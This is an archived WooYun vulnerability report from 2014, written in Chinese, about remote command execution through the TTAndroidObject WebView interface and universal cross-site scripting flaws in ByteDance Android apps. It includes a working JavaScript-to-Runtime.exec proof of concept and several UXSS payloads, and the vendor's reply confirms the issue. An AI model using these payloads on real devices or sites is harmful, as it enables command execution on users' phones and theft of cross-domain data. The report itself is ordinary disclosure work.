{"id": 49202, "wybug_id": "wooyun-2014-074778", "wybug_title": "字节跳动旗下N多产品安卓客户端远程代码执、 跨域漏洞等", "wybug_corp": "字节跳动", "wybug_author": "DuFanG", "wybug_date": "2014-09-02 15:54", "wybug_open_date": "2014-12-01 15:56", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-01：\t细节向公众公开  简要描述： 听说会有礼物~~~我就来了~~~礼物~、、、 详细说明：  漏洞一 命令执行之前有人提交一次你们命令执行可是在这次升级中你们又忽略了检测, 结果导致又出现该漏洞。详情亲看 http://wooyun.org/bugs/wooyun-2010-061543这次测试的是3.6.0版本\n\n如图\n\n\n\n如上图所示存在漏洞接口为 ; TTAndroidObject构造POC如下(感谢mango提供代码):\n<html><head><meta charset=\"utf-8\"><script type=\"text/javascript\">if(window.TTAndroidObject){    try{        TTAndroidObject.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec ([\"/system/bin/sh\",\"-c\",\"echo 'test' > /storage/emulated/0/1.txt\"]);        alert('good job');    }catch(e){        alert(e);    }}</script><title>app test</title></body></html>\n成功执行命令会在目录下生成1.txt 路径的话因为我的是红米你可以自己改。漏洞二: 各种跨域漏洞(只拿今日头条测试,你们的今日娱乐APP也存在)\n<iframe name=\"m\" src=\"http://zone.wooyun.org\" onload=\"window.open('\\u0000javascript:alert(document.domain)','m')\" >\n含有上面代码内容打开网页就会跨域\n\n\n<body><script>i = document.body.appendChild(document.createElement(\"iframe\"));i.src = \"http://www.sogou.com\";i.onload = function(){document.documentURI = \"javascript://hostname.com/%0D%0Aalert('OH HAI ' + location)\";i.contentWindow.location = \"\";}</script></body>\n这个也是如此~~~ \n\n\ntest.html代码：<head><script>main = function(){    specialFrame = document.body.appendChild(document.createElement(\"iframe\"));    document.adoptNode(specialFrame);    document.implementation.createHTMLDocument().adoptNode(specialFrame);    specialFrame.contentWindow.location = \"http://www.baidu.com/\";    interval1 = setInterval(function() {        if (specialFrame.contentDocument)            return;        clearInterval(interval1);        specialFrame.src = \"javascript:alert(document.body.innerHTML)\";        uxssFrame = document.body.appendChild(document.createElement(\"iframe\"));        uxssFrame.src = \"test.svg\";    }, 100);}</script></head><body onload=\"main()\"></body>svg代码：<svg xmlns=\"http://www.w3.org/2000/svg\"><script>svg = document.documentElement;frame = svg.appendChild(document.createElementNS(\"http://www.w3.org/1999/xhtml\", \"iframe\"));frame.contentWindow.onunload = function() {    svg.appendChild(top.specialFrame);}</script> <element param=\"1\" param=\"2\"/></svg>\n两个代码~~~ 可直接跨域。\n\n   漏洞证明：   友情提示一下哦~ 贵公司的内涵段子 内涵社区 的安卓客户端都存在命令执行漏洞且漏洞接口为:TTAndroidObject 下图为证\n\n\n\n\n\n  贵公司的今日头彩APP 存在命令执行漏洞且漏洞接口为:baseWebView 请看下图\n\n   修复方案：   安全这个东西很重要~~希望贵公司尽快修复~  而且要周期性的检查一遍哦~~~ 最后求礼物~~~   版权声明：转载请注明来源 DuFanG@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-09-05 17:56 厂商回复： 某手机厂商的系统版本中，该接口漏洞理应已经修复，但实际未修复。字节跳动旗下产品在下一轮版本更新中会对该厂商的系统做对应处理。同时会通知该厂商修复该漏洞。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}